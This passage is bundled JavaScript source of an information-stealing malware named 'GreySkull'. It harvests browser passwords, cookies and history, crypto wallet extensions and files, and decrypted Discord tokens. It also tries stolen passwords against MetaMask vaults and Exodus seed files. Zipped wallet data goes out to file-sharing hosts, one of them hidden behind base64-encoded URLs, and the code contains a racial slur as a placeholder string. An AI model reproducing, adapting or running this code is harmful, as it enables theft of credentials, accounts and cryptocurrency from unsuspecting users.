  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Comodo\\IceDragon\\Profiles\\", "IceDragon"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\NETGATE Technologies\\BlackHaw\\Profiles\\", "BlackHaw"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\8pecxstudios\\Cyberfox\\Profiles\\", "Cyberfox"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Thunderbird\\Profiles\\", "Thunderbird"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Mozilla\\SeaMonkey\\Profiles\\", "SeaMonkey"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Mozilla\\Firefox\\Profiles\\", "Firefox"));
  geckoPath = geckoPath.concat(getGeckoProfiles(appdata + "\\Waterfox\\Profiles\\", "Waterfox"));
  for (let obj of geckoPath) {
    const path = obj.path;
    if (!fs.existsSync(path)) {
      continue;
    }
    i++;
    try {
      const cookies = await getGeckoCookies(path);
      cookieslength += cookies.length;
      save.saveCookies(cookies, obj.name);
      stat.SaveAllCookies(cookies);
      bookmarks = bookmarks.concat(await getGeckoBookmarks(path, obj.name));
      history = history.concat(await getGeckoHistory(path));
      downloads = downloads.concat(await getGeckoDownloads(path));
      passwords = passwords.concat(await getGeckoPasswords(path, "", obj.name));
    } catch (e) {
      save.SaveError(e + "\nError browsers 1");
      continue;
    }
  }
  const importantSites = ["gmail", "youtube", "onoff", "xss.is", "pronote", "ovhcloud", "nulled", "cracked", "tiktok", "yahoo", "gmx", "aol", "coinbase", "binance", "steam", "epicgames", "discord", "paypal", "instagram", "spotify", "onlyfans", "pornhub", "origin", "amazon", "twitter", "aliexpress", "netflix", "roblox", "twitch", "facebook", "riotgames", "card", "telegram", "protonmail"];
  function countImportantSites(website, importantSites) {
    let count = {};
    importantSites.forEach(importantSite => {
      count[importantSite] = 0;
    });
    website.forEach(visitedSite => {
      importantSites.forEach(importantSite => {
        if (visitedSite.includes(importantSite)) {
          count[importantSite]++;
        }
      });
    });
    return count;
  }
  const count = countImportantSites(website, importantSites);
  for (const site in count) {
    if (count[site] > 0) {
      stat.AddKeyword(` ${site} : ${count[site]}`);
    }
  }
  save.saveBrowser(passwords, autofills, cards, history, downloads, bookmarks);
  stat.AddBrowser(passwords.length, cookieslength, autofills.length, cards.length, history.length, downloads.length, bookmarks.length);
  var pass = [];
  for (let i = 0; i < passwords.length; i++) {
    if (passwords[i]) {
      if (passwords[i].password) pass.push(passwords[i].password);
    }
  }
  return pass;
}
module.exports = {
  GreySkullBrowsers,
  getGeckoPasswords,
  getGeckoProfiles
};
},{"./save":"utils/save.js","./stats":"utils/stats.js","./gecko":"utils/gecko.js","./kill":"utils/kill.js"}],"utils/uploadFiles.js":[function(require,module,exports) {
function ownKeys(e, r) { var t = Object.keys(e); if (Object.getOwnPropertySymbols) { var o = Object.getOwnPropertySymbols(e); r && (o = o.filter(function (r) { return Object.getOwnPropertyDescriptor(e, r).enumerable; })), t.push.apply(t, o); } return t; }
function _objectSpread(e) { for (var r = 1; r < arguments.length; r++) { var t = null != arguments[r] ? arguments[r] : {}; r % 2 ? ownKeys(Object(t), !0).forEach(function (r) { _defineProperty(e, r, t[r]); }) : Object.getOwnPropertyDescriptors ? Object.defineProperties(e, Object.getOwnPropertyDescriptors(t)) : ownKeys(Object(t)).forEach(function (r) { Object.defineProperty(e, r, Object.getOwnPropertyDescriptor(t, r)); }); } return e; }
function _defineProperty(obj, key, value) { key = _toPropertyKey(key); if (key in obj) { Object.defineProperty(obj, key, { value: value, enumerable: true, configurable: true, writable: true }); } else { obj[key] = value; } return obj; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == typeof i ? i : String(i); }
function _toPrimitive(t, r) { if ("object" != typeof t || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != typeof i) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
const fs = require("fs");
const https = require("https");
const FormData = require("form-data");
const axios = require("axios");
async function upload(path) {
  let link;
  try {
    const server = await FoundSrv();
    if (server) {
      link = await uploadFile(path, server);
      if (!link) {
        console.log("uploadTransfer failed, trying uploadToFileio");
        link = await uploadToFileio(path);
      }
      if (!link) {
        console.log("uploadFile failed, trying uploadTransfer");
        link = await uploadTransfer(path);
      }
    } else {
      if (!link) {
        console.log("uploadTransfer failed, trying uploadToFileio");
        link = await uploadToFileio(path);
      }
      console.log("FoundSrv returned null, trying uploadTransfer");
      link = await uploadTransfer(path);
    }
    return link;
  } catch (error) {
    if (error) {
      try {
        console.log("Trying file.io as a fallback");
        link = await uploadToFileio(path);
        return link;
      } catch (e) {
        if (e) {
          try {
            console.log("Trying uploadTransfer as a fallback");
            link = await uploadTransfer(path);
            return link;
          } catch (e) {}
        }
      }
    }
  }
}
async function uploadToFileio(filePath) {
  const data = new FormData();
  data.append("file", fs.createReadStream(filePath));
  data.append("maxdownloads", "30");
  try {
    var _response$data$link;
    const response = await axios.post("https://file.io/", data, {
      headers: _objectSpread({}, data.getHeaders())
    });
    return (_response$data$link = response.data.link) !== null && _response$data$link !== void 0 ? _response$data$link : null;
  } catch (error) {
    return null;
  }
}
async function FoundSrv() {
  const res = await axios({
    url: `https://api.gofile.io/getServer`,
    method: "GET",
    headers: {
      accept: "*/*",
      "accept-language": "en-US,en;",
      "cache-control": "no-cache",
      pragma: "no-cache",
      referrer: "https://gofile.io/uploadFiles",
      mode: "cors",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
      dnt: 1,
      origin: "https://gofile.io"
    }
  });
  if (res.data.status !== "ok") {
    return null;
  }
  return res.data.data.server;
}
async function uploadFile(path, server) {
  const formData = new FormData();
  formData.append("file", fs.createReadStream(path));
  const res = await axios({
    url: `https://${server}.gofile.io/uploadFile`,
    method: "POST",
    headers: _objectSpread({
      accept: "*/*",
      "accept-language": "en-US,en;",
      "cache-control": "no-cache",
      pragma: "no-cache",
      referrer: "https://gofile.io/uploadFiles",
      mode: "cors",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36 Edg/85.0.564.44",
      dnt: 1,
      origin: "https://gofile.io"
    }, formData.getHeaders()),
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    referrer: "https://gofile.io/uploadFiles",
    data: formData
  });
  if (res.data.status !== "ok") {}
  return res.data.data.downloadPage;
}
async function uploadTransfer(path) {
  const FileData = new FormData();
  FileData.append("file", fs.createReadStream(path));
  try {
    let g = Buffer.from("aHR0cHM6Ly90cmFuc2Zlci5zaA==", "base64").toString();
    const res = await axios.post(g, FileData, {
      headers: _objectSpread({}, FileData.getHeaders())
    });
    if (res.status === 200 && res.data) {
      const downloadUrl = res.data.trim();
      return downloadUrl;
    } else {}
  } catch (error) {}
}
module.exports = {
  upload
};
},{}],"utils/crypto.js":[function(require,module,exports) {
const fs = require("fs"),
  seco = require("seco-file"),
  core = require("./core"),
  save = require("./save"),
  passworder = require("node-passworder"),
  {
    stat
  } = require("./stats"),
  {
    upload
  } = require("./uploadFiles");
class Extension {
  constructor(name, id) {
    this.name = name;
    this.id = id;
  }
  addPath(path) {
    this.path = path;
  }
  addProfile(profile) {
    this.profile = profile;
  }
}
class Cold {
  constructor(name, existpath, stealpath) {
    this.name = name;
    this.existpath = existpath;
    this.stealpath = stealpath;
  }
}
function getBrowsersProfile() {
  const local = process.env.localappdata;
  const appdata = process.env.appdata;
  const browsers_path = [local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Extension Settings", appdata + "\\Opera Software\\Opera GX Stable\\Local Extension Settings", appdata + "\\Opera Software\\Opera Stable\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Google\\Chrome Beta\\User Data\\%PROFILE%\\Local Extension Settings", local + "\\Yandex\\YandexBrowser\\User Data\\Local Extension Settings", local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Extension Settings"];
  var browsers_profile = [];
  for (var i = 0; i < browsers_path.length; i++) {
    const browser = browsers_path[i];
    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
    for (var j = 0; j < profiles.length; j++) {
      browsers_profile.push(profiles[j]);
    }
  }
  return browsers_profile;
}
function GreySkullExtensions(cc) {
  if (cc != "yes") return;
  try {
    const browsers_profile = getBrowsersProfile();
    const extensions = [new Extension("Trust Wallet", "egjidjbpglichdcondbcbdnbeeppgdph"), new Extension("Jaxx Liberty", "ocefimbphcgjaahbclemolcmkeanoagc"), new Extension("Atomic Wallet", "dlbmjjglhklgdodnkdlenlicpgppjcdd"), new Extension("Electrum", "hieplnfojfccegoloniefimmbfjdgcgp"), new Extension("Mycelium", "pidhddgciaponoajdngciiemcflpnnbg"), new Extension("Coinomi", "blbpgcogcoohhngdjafgpoagcilicpjh"), new Extension("GreenAddress", "gflpckpfdgcagnbdfafmibcmkadnlhpj"), new Extension("Edge", "doljkehcfhidippihgakcihcmnknlphh"), new Extension("BRD", "nbokbjkelpmlgflobbohapifnnenbjlh"), new Extension("Samourai Wallet", "apjdnokplgcjkejimjdfjnhmjlbpgkdi"), new Extension("Airbitz", "dojmlmceifkfgkgeejemfciibjehhdcl"), new Extension("Trezor", "jpxupxjxheguvfyhfhahqvxvyqthiryh"), new Extension("Ledger Live", "pfkcfdjnlfjcmkjnhcbfhfkkoflnhjln"), new Extension("Ledger Wallet", "hbpfjlflhnmkddbjdchbbifhllgmmhnm"), new Extension("YubiKey", "mammpjaaoinfelloncbbpomjcihbkmmc"), new Extension("Digital Bitbox", "dbhklojmlkgmpihhdooibnmidfpeaing"), new Extension("Google Authenticator", "khcodhlfkpmhibicdjjblnkgimdepgnd"), new Extension("Microsoft Authenticator", "bfbdnbpibgndpjfhonkflpkijfapmomn"), new Extension("Authy", "gjffdbjndmcafeoehgdldobgjmlepcal"), new Extension("Duo Mobile", "eidlicjlkaiefdbgmdepmmicpbggmhoj"), new Extension("OTP Auth", "bobfejfdlhnabgglompioclndjejolch"), new Extension("Dashlane", "flikjlpgnpcjdienoojmgliechmmheek"), new Extension("FreeOTP", "elokfmmmjbadpgdjmgglocapdckdcpkn"), new Extension("Aegis Authenticator", "ppdjlkfkedmidmclhakfncpfdmdgmjpm"), new Extension("LastPass Auth", "cfoajccjibkjhbdjnpkbananbejpkkjb"), new Extension("Keeper", "gofhklgdnbnpcdigdgkgfobhhghjmmkj"), new Extension("RoboForm", "hppmchachflomkejbhofobganapojjol"), new Extension("KeePass", "lbfeahdfdkibininjgejjgpdafeopflb"), new Extension("KeePassXC", "kgeohlebpjgcfiidfhhdlnnkhefajmca"), new Extension("Bitwarden", "inljaljiffkdgmlndjkdiepghpolcpki"), new Extension("NordPass", "njgnlkhcjgmjfnfahdmfkalpjcneebpl"), new Extension("LastPass", "gabedfkgnbglfbnplfpjddgfnbibkmbb"), new Extension("CommonKey", "chgfefjpcobfbnpmiokfjjaglahmnded"), new Extension("Splikity", "jhfjfclepacoldmjmkmdlmganfaalklb"), new Extension("MicrosoftAutofill", "fiedbfgcleddlbcmgdigjgdfcggjcion"), new Extension("KeePass", "fmhmiaejopepamlcjkncpgpdjichnecm"), new Extension("KeePassXC", "oboonakemofpalcgghocfoadofidjkkk"), new Extension("MYKI Password Manager", "bmikpgodpkclnkgmnpphehdgcimmided"), new Extension("Browserpass", "naepdomgkenhinolocfifgehidddafch"), new Extension("LastPass", "hdokiejnpimakedhajhdlcegeplioahd"), new Extension("RoboForm Manager", "pnlccmojcmeohlpggmfnbbiapkmbliob"), new Extension("Metamask", "nkbihfbeogaeaoehlefnkodbefgpgknn"), new Extension("Exodus", "aholpfdialjgjfhomihkjbmgjidlcdno"), new Extension("Sollet", "fhmfendgdocmcbmfikdcogofphimnkno"), new Extension("Trezor Password Manager", "imloifkgjagghnncjkhggdhalmcnfklk"), new Extension("GAuth Authenticator", "ilgcnhelpchnceeipipijaljkblbcobl"), new Extension("EOS Authenticator", "oeljdldpnmdbchonielidgobddffflal"), new Extension("Authy", "gaedmjdfmmahhbjefcbgaolhhanlaolb"), new Extension("Authenticator", "bhghoamapcdpbohphigoooaddinpkbai"), new Extension("EO.Finance", "hoighigmnhgkkdaenafgnefkcmipfjon"), new Extension("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"), new Extension("Coinbase", "hnfanknocfeofbddgcijnmhnfnkdnaad"), new Extension("Jaxx Liberty", "cjelfplplebdjjenllpjcblmjkfcffne"), new Extension("Guarda", "hpglfhgfnhbgpjdenjgmdgoeiappafln"), new Extension("Math", "afbcbjpbpfadlkmhmclhkeeodmamcflc"), new Extension("Binance", "fhbohimaelbohpjbbldcngcnapndodjp"), new Extension("Nifty", "jbdaocneiiinmjbjlgalhcelgbejmnid"), new Extension("Yoroi", "ffnbelfdoeiohenkjibnmadjiehjhajb"), new Extension("EQUAL", "blnieiiffboillknjnepogjhkgnoapac"), new Extension("BitApp", "fihkakfobkmkjojpchpfgcmhfjnmnfpi"), new Extension("iwallet", "kncchdigobghenbbaddojjnnaogfppfj"), new Extension("Wombat", "amkmjjmmflddogmhpjloimipbofnfjih"), new Extension("MEW CX", "nlbmnnijcnlegkjjpcfjclmcfggfefdm"), new Extension("Guild", "nanjmdknhkinifnkgdcggcfnhdaammmj"), new Extension("Ronin", "fnjhmkhhmkbjkkabndcnnogagogbneec"), new Extension("NeoLine", "cphhlgmgameodnhkjdmkpanlelnlohao"), new Extension("Clover", "nhnkbkgjikgcigadomkphalanndcapjk"), new Extension("Liquality", "kpfopkelmapcoipemfendmdcghnegimn"), new Extension("Terra Station", "aiifbnbfobpmeekipheeijimdpnlpgpp"), new Extension("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"), new Extension("Coin98", "aeachknmefphepccionboohckonoeemg"), new Extension("ZilPay", "klnaejjgbibmhlephnhpmaofohgkpgkd"), new Extension("Hycon Lite Client", "bcopgchhojmggmffilplmbdicgaihlkp"), new Extension("Nash", "onofpnbbkehpmmoabgpcpmigafmmnjhl"), new Extension("Steem Keychain", "jhgnbkkipaallpehbohjmkbjofjdmeid"), new Extension("BitClip", "ijmpgkjfkbfhoebgogflfebnmejmfbml"), new Extension("DAppPlay", "lodccjjbdhfakaekdiahmedfbieldgik"), new Extension("Auro", "cnmamaachppnkjgnildpdmkaakejnhae"), new Extension("Polymesh", "jojhfeoedkpkglbfimdfabpdfjaoolaf"), new Extension("ICONex", "flpiciilemghbmfalicajoolhkkenfel"), new Extension("Nabox", "nknhiehlklippafakaeklbeglecifhad"), new Extension("KHC", "hcflpincpppdclinealmandijcmnkbgn"), new Extension("Temple", "ookjlbkiijinhpmnjffcofjonbfbgaoc"), new Extension("TezBox", "mnfifefkajgofkcjkemidiaecocnkjeh"), new Extension("Cyano", "dkdedlpgdmmkkfjabffeganieamfklkm"), new Extension("Byone", "nlgbhdfgdhgbiamfdfmbikcdghidoadd"), new Extension("OneKey", "infeboajgfhgbjpjbeppbkgnabfdkdaf"), new Extension("Leaf", "cihmoadaighcejopammfbmddcmdekcje"), new Extension("Dashlane", "fdjamakpfbbddfjaooikfcpapjohcfmg"), new Extension("NordPass", "fooolghllnmhmmndgjiamiiodkpenpbb"), new Extension("BitWarden", "nngceckbapebfimnlniiiahkandclblb")];
    var final_extensions = [];
    for (var i = 0; i < browsers_profile.length; i++) {
      const profile = browsers_profile[i].path;
      for (var j = 0; j < extensions.length; j++) {
        const extension = extensions[j];
        const path = profile + "\\" + extension.id;
        if (fs.existsSync(path)) {
          extension.addPath(path);
          extension.addProfile(profile.split("\\")[6].replace(" ", ""));
          final_extensions.push(extension);
        }
      }
    }
    for (var i = 0; i < final_extensions.length; i++) {
      const extension = final_extensions[i];
      stat.AddExtensions(extension.name);
      save.Save(extension.path + "\\", "Wallets", "Extensions\\" + extension.name + "-" + extension.profile);
    }
  } catch (e) {
    save.SaveError(e);
  }
}
async function GreySkullColds(cc) {
  if (cc != "yes") return;
  try {
    const appdata = process.env.appdata;
    const local = process.env.localappdata;
    const colds = [new Cold("Exodus", appdata + "\\Exodus", [appdata + "\\Exodus\\exodus.wallet\\", appdata + "\\Exodus\\exodus.conf.json", appdata + "\\Exodus\\window-state.json"]), new Cold("Electrum", appdata + "\\Electrum-LTC", [appdata + "\\Electrum-LTC\\wallets\\"]), new Cold("Atomic", appdata + "\\atomic", [appdata + "\\atomic\\Local Storage\\leveldb\\"]), new Cold("MultiDog", appdata + "\\MultiDog", [appdata + "\\MultiDog\\multidoge.wallet\\"]), new Cold("Bitcoin Core", appdata + "\\Bitcoin\\Bitcoin Core", [appdata + "\\Bitcoin\\Bitcoin Core\\wallet.dat"]), new Cold("Binance", appdata + "\\Binance", [appdata + "\\Binance\\app-store.json", appdata + "\\Binance\\Cookies"]), new Cold("Coinomi", appdata + "\\Coinomi", [appdata + "\\Coinomi\\wallets\\"]), new Cold("Jax", appdata + "\\jaxx", [appdata + "\\jaxx\\LocalStorage\\file_0.localstorage"]), new Cold("ElectronCash", appdata + "\\ElectronCash", [appdata + "\\ElectronCash\\wallets\\default_wallet"]), new Cold("Electrum", appdata + "\\Electrum", [appdata + "\\Electrum\\wallets\\"]), new Cold("Ether", appdata + "\\Ethereum", [appdata + "\\Ethereum\\keystore\\"]), new Cold("Zcash", appdata + "\\Zcash", [appdata + "\\Zcash"]), new Cold("Armory", appdata + "\\Armory", [appdata + "\\Armory"]), new Cold("Bytecoin", appdata + "\\Bytecoin", [appdata + "\\Bytecoin"]), new Cold("Jaxx", appdata + "\\Jaxx", [appdata + "\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file_0.indexeddb.leveldb"]), new Cold("Guarda", appdata + "\\Guarda", [appdata + "\\Guarda\\Local Storage\\leveldb"]), new Cold("Coinomi", local + "\\Coinomi", [appdata + "\\Coinomi\\Coinomi\\wallets"])];
    for (var i = 0; i < colds.length; i++) {
      const cold = colds[i];
      if (fs.existsSync(cold.existpath)) {
        if (cold.name == "Exodus") {
          stat.AddColds(cold.name);
          await save.ArraySave(cold.stealpath, "Wallets", cold.name);
          const zipPath = await save.zip(cold.stealpath);
          let exodusurl = await upload(zipPath);
          stat.addExodusLink(exodusurl);
        }
        if (cold.name == "Atomic") {
          stat.AddColds(cold.name);
          await save.ArraySave(cold.stealpath, "Wallets", cold.name);
          const zipPath = await save.zip(cold.stealpath);
          let atomicurl = await upload(zipPath);
          stat.addAtomicLink(atomicurl);
        }
        stat.AddColds(cold.name);
        save.ArraySave(cold.stealpath, "Wallets", cold.name);
      }
    }
  } catch (e) {
    save.SaveError(e);
  }
}
async function Decrypt(data, key) {
  var res = "";
  try {
    res = await passworder.decrypt(key, data);
  } catch (err) {}
  return res;
}
async function decodeMetamask(password, vault) {
  var vaultJson = null;
  try {
    var vaultJson = JSON.parse(vault);
  } catch (e) {}
  if (vaultJson == null) {
    return;
  }
  return await Decrypt(vault, password);
}
function getMnemonic(json) {
  var res = "";
  for (var key of json) {
    var mnemonic = key.data.mnemonic;
    if (mnemonic != undefined) {
      if (Array.isArray(mnemonic)) {
        res = Buffer.from(mnemonic).toString("utf-8");
      } else {
        res = mnemonic;
      }
    }
  }
  return res;
}
function decryptExodus(data, phrase) {
  try {
    seco.decryptData(data, phrase);
    return phrase;
  } catch (ex) {
    return "";
  }
}
async function decryptFileSeco(filename, passwlist) {
  const list = passwlist;
  var data = fs.readFileSync(filename);
  var phrase;
  try {
    if (list.length > 0) {
      list.forEach(function (element) {
        phrase = decryptExodus(data, element);
        if (phrase != "" && !stat.exodus.includes(phrase)) {
          stat.AddExodus(phrase);
        }
      });
    }
  } catch (e) {}
}
async function exodusDecrypt(cc, passwords) {
  if (cc != "yes") return;
  const appdata = process.env.appdata;
  const seedpath = appdata + "\\Exodus\\exodus.wallet\\seed.seco";
  if (fs.existsSync(seedpath)) {
    try {
      decryptFileSeco(seedpath, passwords);
    } catch (e) {}
  } else {}
}
async function GreySkullFetchMeta(passwd) {
  const browsers_profile = getBrowsersProfile();
  var folders = [];
  var vaults = [];
  for (let i = 0; i < browsers_profile.length; i++) {
    const browser = browsers_profile[i];
    const savePath = browser + "\\nkbihfbeogaeaoehlefnkodbefgpgknn\\";
    if (fs.existsSync(savePath)) {
      folders.push(savePath);
    }
  }
  for (let i = 0; i < folders.length; i++) {
    const folder = folders[i];
    const files = fs.readdirSync(folder);
    for (let u = 0; u < files.length; u++) {
      const file = files[u];
      if (file.endsWith(".log")) {
        const data = fs.readFileSync(folder + file, "utf-8");
        const regex = /\"vault":"(?:[^\\"]|\\\\|\\")*"\}/gm;
        const finds = data.match(regex);
        for (let o = 0; o < finds.length; o++) {
          const find = finds[o];
          vaults.push(find.replace(/\\/gm, "").replace('"vault":"', "").slice(0, -2));
        }
      }
    }
  }
  vaults = [...new Set(vaults)];
  var mnemonics = [];
  for (let i = 0; i < vaults.length; i++) {
    const vault = vaults[i];
    for (let u = 0; u < passwd.length; u++) {
      const password = passwd[u];
      var tryPass = await decodeMetamask(password, vault);
      if (tryPass != "" && tryPass != undefined) {
        mnemonics.push(getMnemonic(tryPass));
      }
    }
  }
  mnemonics = [...new Set(mnemonics)];
  mnemonics = mnemonics.filter(e => e);
  let phrases = [];
  for (let i = 0; i < mnemonics.length; i++) {
    phrases.push({
      phrase: mnemonics[i]
    });
  }
  return phrases;
}
module.exports = {
  GreySkullExtensions,
  GreySkullColds,
  GreySkullFetchMeta,
  exodusDecrypt
};
},{"./core":"utils/core.js","./save":"utils/save.js","./stats":"utils/stats.js","./uploadFiles":"utils/uploadFiles.js"}],"utils/discord.js":[function(require,module,exports) {
const fs = require("fs"),
  core = require("./core"),
  axios = require("axios"),
  boukiapi = require("boukiapi"),
  crypto = require("crypto"),
  {
    stat
  } = require("./stats"),
  path = require("path"),
  {
    embeds,
    stats,
    badge
  } = require("./emotes");
async function WriteDiscord(profiles) {
  const basepath = stat.testpath[0];
  const socialDir = path.join(basepath, "Social");
  const DiscordDir = path.join(socialDir, "Discord");
  try {
    if (!fs.existsSync(socialDir)) {
      fs.mkdirSync(socialDir);
    }
    if (!fs.existsSync(DiscordDir)) {
      fs.mkdirSync(DiscordDir);
    }
  } catch (e) {
    return;
  }
  if (!profiles) return;
  if (!profiles.length < 1) return;
  const dscFilePath = path.join(DiscordDir, "Discord.txt");
  fs.writeFileSync(dscFilePath, core.getHeader() + JSON.stringify(profiles));
}
class DiscordAccount {
  constructor(username, discriminator, id, nitro, badges, billings, email, phone, token, avatar) {
    this.username = username;
    this.tag = `${username}#${discriminator}`;
    this.id = id;
    this.nitro = nitro;
    this.badges = badges;
    this.billings = billings;
    this.email = email;
    if (phone != "" && phone != undefined) {
      this.phone = phone;
    } else {
      this.phone = "None";
    }
    this.token = token;
    this.avatar = "https://cdn.discordapp.com/avatars/" + id + "/" + avatar + ".png";
  }
}
function getBadges(json) {
  let badges = [{
    name: badge.staff,
    flag: 1
  }, {
    name: badge.partner,
    flag: 2
  }, {
    name: badge.hypesquad_event,
    flag: 4
  }, {
    name: badge.bughunter_1,
    flag: 8
  }, {
    name: badge.bughunter_2,
    flag: 16384
  }, {
    name: badge.developer,
    flag: 131072
  }, {
    name: badge.early,
    flag: 512
  }, {
    name: badge.bravery,
    flag: 64
  }, {
    name: badge.brillance,
    flag: 128
  }, {
    name: badge.balance,
    flag: 256
  }, {
    name: badge.active_developer,
    flag: 4194304
  }];
  let flag = json["flags"];
  var badgesRes = "";
  for (let badge of badges) {
    if ((flag & badge.flag) == badge.flag) {
      badgesRes = badgesRes + " " + badge.name;
    }
  }
  return badgesRes == "" ? "`None`" : badgesRes;
}
async function getInventory(token) {
  const url = "https://discord.com/api/v9/outbound-promotions";
  const authToken = token;
  try {
    const response = await axios.get(url, {
      headers: {
        Authorization: `${authToken}`
      }
    });
    if (response.status === 200) {
      const promotion = response.data;
      const g = promotion.map(prom => `🎁 ${prom.outbound_title}`);
      const gString = g.join("\n");
      return gString;
    } else {
      return null;
    }
  } catch (error) {
    return null;
  }
}
async function getBilling(token) {
  var billings = "";
  try {
    const res = await axios({
      url: `https://canary.discord.com/api/v9/users/@me/billing/payment-sources`,
      method: "GET",
      headers: {
        Authorization: `${token}`
      }
    });
    for (let billing of res.data) {
      let type = billing["type"];
      let invalid = billing["invalid"];
      if (type == 1 && !invalid) {
        billings = billings + ` ${embeds.creditcard}`;
      }
      if (type == 2 && !invalid) {
        billings = billings + ` ${embeds.paypal}`;
      }
    }
  } catch (e) {}
  return billings == "" ? "`None`" : billings;
}
async function getAccounts(tokens) {
  let accounts = [];
  let validTokensCount = 0;
  for (let i = 0; i < tokens.length; i++) {
    let token = tokens[i];
    let billing = await getBilling(token);
    try {
      const res = await axios({
        url: `https://discord.com/api/v9/users/@me`,
        method: "GET",
        headers: {
          Authorization: `${token}`
        }
      });
      const json = res.data;
      if (json.message == null) {
        accounts.push(new DiscordAccount(json.username, json.discriminator, json.id, "NigaUnused", getBadges(json), billing, json.email, json.phone, token, json.avatar));
        validTokensCount++;
      }
    } catch (e) {}
  }
  return accounts;
}
const appdata = process.env.appdata;
const local = process.env.localappdata;
async function GreySkullDiscord() {
  var tokens = [];
  var discordpaths = {
    Discord: appdata + "\\discord\\Local Storage\\leveldb\\",
    "Discord Canary": appdata + "\\discordcanary\\Local Storage\\leveldb\\",
    Lightcord: appdata + "\\Lightcord\\Local Storage\\leveldb\\",
    "Discord PTB": appdata + "\\discordptb\\Local Storage\\leveldb\\"
  };
  for (let [key, value] of Object.entries(discordpaths)) {
    if (!fs.existsSync(value)) {
      continue;
    }
    for (var file_name of fs.readdirSync(value)) {
      if (!file_name.endsWith(".log") && !file_name.endsWith(".ldb")) {
        continue;
      }
      let path_split = value.split("\\"),
        path_split_tail = value.includes("Network") ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2),
        path_tail = path_split_tail.join("\\") + "\\";
      for (var line of fs.readFileSync(`${value}/${file_name}`, "utf8").split("\n")) {
        if (value.includes("cord")) {
          let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail.replace("Local Storage", "Local State"))).os_crypt.encrypted_key, "base64").slice(5);
          try {
            const _key = boukiapi.unprotectData(Buffer.from(encrypted, "utf-8"), null, "CurrentUser");
            var encrypted_regex = /dQw4w9WgXcQ:[^\"]*/;
            if (line.match(encrypted_regex)) {
              try {
                var token = Buffer.from(line.match(encrypted_regex)[0].split("dQw4w9WgXcQ:")[1], "base64");
                let start = token.slice(3, 15),
                  middle = token.slice(15, token.length - 16),
                  end = token.slice(token.length - 16, token.length),
                  decipher = crypto.createDecipheriv("aes-256-gcm", _key, start);
                decipher.setAuthTag(end);
                token = decipher.update(middle, "base64", "utf-8") + decipher.final("utf-8");
                tokens.push(token);
              } catch (e) {}
            }
          } catch (e) {}
        }
      }
    }
  }
  var browsers_path = [appdata + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", appdata + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\", local + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\", local + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", local + "\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", local + "\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\", local + "\\CentBrowser\\User Data\\Local Storage\\leveldb\\", local + "\\Orbitum\\User Data\\Local Storage\\leveldb\\", local + "\\Kometa\\User Data\\Local Storage\\leveldb\\", local + "\\Torch\\User Data\\Local Storage\\leveldb\\", local + "\\Amigo\\User Data\\Local Storage\\leveldb\\", local + "\\BraveSoftware\\Brave-Browser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Iridium\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Yandex\\YandexBrowser\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\uCozMedia\\Uran\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Microsoft\\Edge\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Google\\Chrome\\User Data\\%PROFILE%\\Local Storage\\leveldb\\", local + "\\Vivaldi\\User Data\\%PROFILE%\\Local Storage\\leveldb\\"];
  var browsers_profile = [];
  for (var i = 0; i < browsers_path.length; i++) {
    const browser = browsers_path[i];
    const profiles = core.getProfiles(browser, browser.split("\\")[6]);
    for (var j = 0; j < profiles.length; j++) {
      browsers_profile.push(profiles[j].path);
    }
  }
  const reg1 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9", "base64").toString();
  const reg2 = Buffer.from("bWZhXC5bXHctXXs4NH0=", "base64").toString();
  const reg3 = Buffer.from("W1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17MjUsMTEwfQ==", "base64").toString();
  const cleanRegex = [new RegExp(reg1, "gm"), new RegExp(reg2, "gm"), new RegExp(reg3, "gm")];
  for (let path of browsers_profile) {
    if (!fs.existsSync(path)) {
      continue;
    }
    let files = fs.readdirSync(path);
    for (let file of files) {
      for (let reg of cleanRegex) {
        if (!(file.endsWith(".log") || file.endsWith(".ldb"))) {
          continue;
        }
        let content = fs.readFileSync(path + file, "utf-8");
        Array.prototype.push.apply(tokens, content.match(reg));
      }
    }
  }
  let uniqueTokens = [];
  tokens.forEach(token => {
    let prefix = token.split(".")[0];
    if (!uniqueTokens.some(existingToken => existingToken.startsWith(prefix))) {
      uniqueTokens.push(token);
    }
  });
